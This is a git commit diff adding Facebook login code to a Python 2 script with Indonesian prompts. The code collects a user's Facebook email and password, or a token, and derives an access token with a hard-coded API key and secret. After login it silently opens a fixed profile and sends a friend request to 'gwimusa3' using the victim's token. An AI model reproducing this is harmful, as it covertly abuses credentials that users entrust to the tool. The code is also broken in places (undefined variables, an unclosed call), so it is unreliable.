2bc77489be179ccd0e38faaefcf79eb530909814
gendeng777 <69396037+gendeng777@users.noreply.github.com>
2020-11-30 20:11:43 +0700

    Update list.py

--- list.py
+++ list.py
@@ -18,6 +18,146 @@ logo = """\033[1;93m_/﹋\_
 \033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
 \033[1;31m╚════════════════════════════════════════╝\033[0m"""
 
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('clear')
+	login()
+####login#########
+def login():
+	os.system('clear')
+	print logo
+	print
+	print 42*"\033[1;96m="
+	time.sleep(0.05)
+	print "\033[1;96m[1] \033[1;93mLogin Akun Facebook  "
+        time.sleep(0.05)
+        print "\033[1;96m[2] \033[1;93mLogin Akun Facebook Pakai Acces token "
+	time.sleep(0.05)
+	print "\033[1;96m[3] \033[1;97mKeluar        "
+	print 42*"\033[1;96m="
+	pilih_login()
+
+def pilih_login():
+	peak = raw_input("\n\033[1;92mPilih Nomer \033[1;95m : ")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_login()
+	elif peak =="1":
+		login1()
+        elif peak =="2":
+	        tokenz()
+	elif unikers =="0":
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+		
+	
+def login1():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+                time.sleep(0.05)
+		print logo
+		jalan('\033[1;96m[!] \x1b[1;34mJangan Menggunakan akun fb lama' )
+		jalan('\033[1;96m[!] \x1b[1;34mGunakan akun baru/via token' )
+		print 42*"\033[1;96m="
+		id = raw_input('\033[1;96m[!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
+		print 42*"\033[1;96m="
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\x1b[1;97mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				jalan( '\n\x1b[1;95mLogin Successful...') 
+				os.system('xdg-open https://www.facebook.com/dogukan.er.144')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;97mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;93mPassword/Email Anda Salah")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+
+def tokenz():
+	os.system('clear')
+	print logo
+	toket = raw_input("\033[1;96m[+] \033[1;93mToken Facebook \033[1;91m: ")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		jalan( '\n\x1b[1;93mLogin Berhasil.....') 
+		os.system('xdg-open https://m.facebook.com/dogukan.er.144')
+		requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+toket)
+		menu()
+	except KeyError:
+		print "\033[1;96m[!] \033[1;31mSalah"
+
+
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://web.facebook.com/login.php?login_attempt=1'
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print"\033[1;96m[!] \033[1;91mSepertinya akun anda kena checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+		keluar()
+
 
 os.system('clear')
 print logo
